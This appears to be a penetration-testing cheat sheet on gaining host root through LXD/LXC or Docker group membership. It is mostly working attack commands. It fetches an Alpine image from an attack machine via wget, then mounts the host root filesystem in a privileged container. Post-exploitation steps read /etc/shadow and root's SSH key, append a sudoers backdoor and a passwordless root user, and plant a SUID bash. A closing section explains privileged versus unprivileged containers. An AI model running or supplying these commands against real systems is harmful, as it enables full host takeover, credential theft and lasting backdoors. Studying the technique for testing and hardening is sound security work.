## Container-Based Privilege Escalation

Containers share the host kernel but isolate processes, filesystems, and network interfaces. The key security boundary between a container and its host is only as strong as the container's configuration.  When `security.privileged=true` is set, that boundary collapses completely because UID 0 inside the container maps directly to UID 0 on the host.
***

## LXC vs LXD

| | LXC | LXD |
|---|---|---|
| Full name | Linux Containers | Linux Daemon |
| Purpose | Application containers | Full system containers |
| Scope | Isolates individual processes | Runs complete OS instances |
| Management | Direct via `lxc-*` commands | Managed via `lxd` daemon and `lxc` client |
| Privilege risk | Group `lxc` | Group `lxd` |

Both share the same exploitation path once group membership is confirmed. 

***

## LXD/LXC Privilege Escalation

### Confirm Group Membership

```bash
id
# uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

### Method 1: Using an Existing Template on the Target

Some systems already have container images available, often without passwords or hardened configurations. 

```bash
# Check for existing images or templates
find / -name "*.tar.xz" -o -name "*.tar.gz" 2>/dev/null | grep -i "ubuntu\|alpine\|template"
ls ~/ContainerImages/

# Import the found template
lxc image import ubuntu-template.tar.xz --alias ubuntutemp

# Verify import
lxc image list
```

### Method 2: Build Alpine Image on Attack Machine and Transfer

If no image exists on the target, build one locally. Alpine is used because it is small and transfers quickly.

```bash
# On your attack machine
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine
# Produces: alpine-v3.xx-x86_64-<date>.tar.gz

# Transfer to target
python3 -m http.server 8080
# On target:
wget http://10.10.14.15:8080/alpine-v3.xx.tar.gz
```

### Full Exploitation Sequence

```bash
# 1. If lxd has not been initialised, do so first (accept all defaults)
lxd init

# 2. Import the image
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc image list   # Confirm fingerprint appears

# 3. Create a privileged container
lxc init alpine r00t -c security.privileged=true

# 4. Mount the entire host filesystem into the container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

The `source=/` mounts the host root. `path=/mnt/root` is the mountpoint inside the container. `recursive=true` includes all subdirectories. 

```bash
# 5. Start the container and get a shell
lxc start r00t
lxc exec r00t /bin/sh

# 6. Confirm root inside the container
id
# uid=0(root) gid=0(root)
```

### Post-Exploitation via the Mounted Host Filesystem

Everything under `/mnt/root` inside the container is the live host filesystem accessible as root: 

```bash
# Read root's SSH private key
cat /mnt/root/root/.ssh/id_rsa

# Read all password hashes
cat /mnt/root/etc/shadow

# Permanently backdoor the host: add yourself to sudoers
echo 'container-user ALL=(ALL) NOPASSWD: ALL' >> /mnt/root/etc/sudoers

# Add a new root user to /etc/passwd
echo 'hacker::0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd

# Drop a SUID bash copy onto the host
cp /mnt/root/bin/bash /mnt/root/tmp/rootbash
chmod +s /mnt/root/tmp/rootbash
# Exit container, then on host:
/tmp/rootbash -p

# Alternatively, chroot directly into the host environment
chroot /mnt/root /bin/bash
# Now fully inside the host as root, not just the container
id
# uid=0(root) gid=0(root)
```

***

## Docker Group Privilege Escalation

The Docker group provides the same effective access.  Any member can create containers with the host filesystem mounted. 

```bash
# Confirm group membership
id | grep docker

# Mount host root, chroot into it, get a shell
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
id
# uid=0(root) gid=0(root)

# Alternative: targeted mount for credential extraction
docker run -v /etc:/mnt --rm -it alpine sh
cat /mnt/shadow

# Persist access: add root user to host /etc/passwd
docker run -v /etc:/mnt --rm -it alpine sh -c \
  'echo "hacker:$(openssl passwd -1 pass123):0:0:root:/root:/bin/bash" >> /mnt/passwd'
# Exit then on host:
su hacker
```

***

## Detecting Whether You Are Inside a Container

When landing on a shell, check if you are already inside a container before attempting host escalation:

```bash
# Check for container indicators
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv 2>/dev/null          # File present in Docker containers
cat /proc/self/mountinfo | grep lxc # LXC indicator
systemd-detect-virt                  # Reports 'lxc', 'docker', or 'none'
hostname                             # Often a random hex string in Docker
env | grep container                 # May show CONTAINER=lxc
```

If you are inside a container, the host is still reachable via the techniques above if the container is privileged, has mounted the Docker socket, or has excess kernel capabilities.

***

## Key Security Boundary Differences

```
Privileged container (security.privileged=true):
  Host kernel <-> Container root = SAME USER
  /mnt/root = full host filesystem with root r/w

Unprivileged container (default):
  UID 0 inside container = UID 100000+ on host
  Kernel namespace isolation intact
  Mounting host / is blocked
```

Any container with `--privileged` (Docker) or `security.privileged=true` (LXD) should be treated as equivalent to direct root access to the host.  The container boundary provides zero security in that configuration. 
